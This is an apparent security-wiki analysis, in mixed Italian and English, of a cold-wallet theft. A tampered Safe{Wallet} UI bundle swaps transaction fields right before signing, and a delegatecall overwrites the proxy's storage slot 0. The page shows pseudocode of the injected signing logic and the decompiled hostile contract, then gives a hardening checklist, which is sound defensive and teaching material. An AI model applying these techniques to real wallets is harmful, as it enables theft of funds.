# Compromesso del Web3 Signing Workflow & Safe Delegatecall Proxy Takeover

{{#include ../../banners/hacktricks-training.md}}

## Panoramica

Una catena di furto di cold-wallet ha combinato un **supply-chain compromise of the Safe{Wallet} web UI** con una **on-chain delegatecall primitive that overwrote a proxy’s implementation pointer (slot 0)**. I punti chiave sono:

- Se una dApp può injectare codice nel signing path, può far sì che un signer produca una valida **EIP-712 signature over attacker-chosen fields** ripristinando i dati originali della UI in modo che gli altri signer non si accorgano.
- I Safe proxies memorizzano `masterCopy` (implementation) nello **storage slot 0**. Una delegatecall verso un contratto che scrive nello slot 0 effettivamente “upgrades” il Safe alla logica dell'attaccante, ottenendo il controllo totale del wallet.

## Off-chain: Mutazione mirata della firma in Safe{Wallet}

Un bundle Safe manomesso (`_app-*.js`) attaccava selettivamente specifici indirizzi Safe + signer. La logica iniettata veniva eseguita immediatamente prima della chiamata di signing:
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Attack properties
- **Context-gated**: hard-coded allowlists per victim Safes/signers hanno ridotto il rumore e abbassato la probabilità di rilevamento.
- **Last-moment mutation**: fields (`to`, `data`, `operation`, gas) sono stati sovrascritti immediatamente prima di `signTransaction`, poi ripristinati, quindi i payload delle proposte nell'UI sembravano benigni mentre le firme corrispondevano al payload dell'attaccante.
- **EIP-712 opacity**: i wallet mostravano dati strutturati ma non decodificavano il nested calldata né evidenziavano `operation = delegatecall`, rendendo il messaggio mutato di fatto firmato alla cieca.

### Gateway validation relevance
Le proposte Safe vengono inviate al **Safe Client Gateway**. Prima dei controlli rafforzati, il gateway poteva accettare una proposta in cui `safeTxHash`/signature corrispondevano a campi diversi rispetto al corpo JSON se l'UI li riscriveva dopo la firma. Dopo l'incidente, il gateway ora rifiuta proposte il cui hash/signature non corrispondono alla transazione inviata. Verifiche di hash lato server simili dovrebbero essere imposte su qualsiasi signing-orchestration API.

## On-chain: Delegatecall proxy takeover via slot collision

I Safe proxies mantengono `masterCopy` in **storage slot 0** e delegano tutta la logica ad esso. Poiché Safe supporta **`operation = 1` (delegatecall)**, qualsiasi transazione firmata può puntare a un contratto arbitrario ed eseguire il suo codice nel contesto di storage del proxy.

Un contratto dell'attaccante imitava un ERC-20 `transfer(address,uint256)` ma invece scriveva `_to` nello slot 0:
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Execution path:
1. Le vittime firmano `execTransaction` con `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Il Safe masterCopy valida le firme su questi parametri.
3. Proxy esegue delegatecall verso `attackerContract`; il corpo di `transfer` scrive nello slot 0.
4. Lo slot 0 (`masterCopy`) ora punta a logica controllata dall'attaccante → **completa acquisizione del wallet e svuotamento dei fondi**.

## Detection & hardening checklist

- **UI integrity**: pin JS assets / SRI; monitor bundle diffs; treat signing UI as part of the trust boundary.
- **Sign-time validation**: hardware wallets with **EIP-712 clear-signing**; explicitly render `operation` and decode nested calldata. Reject signing when `operation = 1` unless policy allows it.
- **Server-side hash checks**: gateways/services that relay proposals must recompute `safeTxHash` and validate signatures match the submitted fields.
- **Policy/allowlists**: preflight rules for `to`, selectors, asset types, and disallow delegatecall except for vetted flows. Require an internal policy service before broadcasting fully signed transactions.
- **Contract design**: avoid exposing arbitrary delegatecall in multisig/treasury wallets unless strictly necessary. Place upgrade pointers away from slot 0 or guard with explicit upgrade logic and access control.
- **Monitoring**: alert on delegatecall executions from wallets holding treasury funds, and on proposals that change `operation` from typical `call` patterns.

## References

- [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
